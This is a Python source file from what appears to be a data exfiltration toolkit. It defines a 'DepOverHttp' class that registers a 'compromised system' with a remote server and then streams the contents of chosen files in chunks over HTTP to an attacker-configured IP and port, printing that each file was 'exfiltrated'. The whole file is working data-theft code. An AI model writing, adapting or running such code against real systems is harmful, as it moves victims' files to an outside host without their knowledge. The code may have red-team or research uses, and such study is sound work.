import os
import time
import socket

from npdep_transfer.base.Transfer import Transfer

from dep_common.hash.Hash import Hash as HashCalc
from dep_common.converter.Converter import Converter as DEPConverter
from dep_common.msg.MessageFactory import MessageFactory as DEPMessageFactory
from npdep_http_client.client.Client import Client as HTTPClient

'''
Transfers data by tunneling Data Exfiltration Protocol through HTTP
'''
class DepOverHttp(Transfer):
    def __init__(self, options, registration) -> None:
        super().__init__("DepOverHttp", options, registration)
        self.httpClient = HTTPClient(options["ip"], options["port"])
        self.depMsgFactory = DEPMessageFactory()

    def init(self):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)
        simMsg = self.depMsgFactory.createSystemInformationMessage(b_uuid, self.options["pkgSize"])
        # Compromised system is registered at the server
        self.httpClient.sendHttpRequest(s=None, path="/", payload=simMsg)

    def send(self, container):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)
        for path in container["files"]:
            # Get the file size of the file
            fileSize = os.path.getsize(path)
            # Generate sha256 hash of the file
            b_sha256 = HashCalc.getSha256Hash(path)
            # create and send metadata of the file to the server
            dimMsg = self.depMsgFactory.createDataInformationMessage(b_uuid, b_sha256, path, fileSize)
            self.httpClient.sendHttpRequest(s=None, path="/", payload=dimMsg)
            time.sleep(.8) # This sleep is necessary to realize smooth data sending
            # From now on, the file will be read in chunks to be transfered to the server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.options["ip"], self.options["port"]))
            with open(path, "rb") as f:
                counter = 1
                while True:
                    data = f.read(self.options["pkgSize"])
                    if not data:
                        break
                    dcmMsg = self.depMsgFactory.createDataContentMessage(b_uuid, b_sha256, counter, data)
                    self.httpClient.sendHttpRequest(s, "/", dcmMsg)
                    counter = counter + 1
            s.close()
            print(path + " exfiltrated!")  